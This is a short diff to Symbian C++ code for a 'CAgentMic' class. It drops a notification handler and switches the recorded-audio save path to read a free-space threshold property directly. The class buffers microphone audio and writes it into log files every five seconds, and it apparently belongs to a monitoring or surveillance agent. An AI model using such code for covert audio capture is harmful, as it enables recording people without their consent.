@@ -170,29 +170,6 @@ void CAgentMic::StopAgentCmdL()
 	
 	}
 
-void CAgentMic::NotifyAgentCmdL(TUint32 aData)
-	{
-	TInt notifyType = aData & 0x000000ff;
-	switch(notifyType)
-		{
-		case ENotifyThreshold:
-			{
-			TInt value = (aData & 0x0000ff00) >> 8;
-			if (value == EBelow)
-				{
-				iBelowFreespaceQuota = ETrue;
-				}
-			else
-				{
-				iBelowFreespaceQuota = EFalse;
-				}
-			}
-			break;
-		default:
-			break;
-		}
-	}
-
 
 /*
  * MMdaAudioInputStream callbacks (MMdaAudioInputStreamCallback)
@@ -270,7 +247,9 @@ void CAgentMic::MaiscBufferCopied(TInt aError, const TDesC8& aBuffer)
 			iFramesCounter++;
 			if(iFramesCounter == KFrameCountAMR)
 				{
-				if(!iBelowFreespaceQuota)
+				TInt value;
+				RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
+				if(value)
 					{
 					// 5 sec has been recorded, save log...
 					CLogFile* logFile = CLogFile::NewLC(iFs);
@@ -290,7 +269,9 @@ void CAgentMic::MaiscBufferCopied(TInt aError, const TDesC8& aBuffer)
 		if(aBuffer.Length())
 			{
 			iRecData->Des().Append(aBuffer);
-			if(!iBelowFreespaceQuota)
+			TInt value;
+			RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
+			if(value)
 				{
 				CLogFile* logFile = CLogFile::NewLC(iFs);
 				logFile->CreateLogL(LOGTYPE_MIC, &iMicAdditionalData);
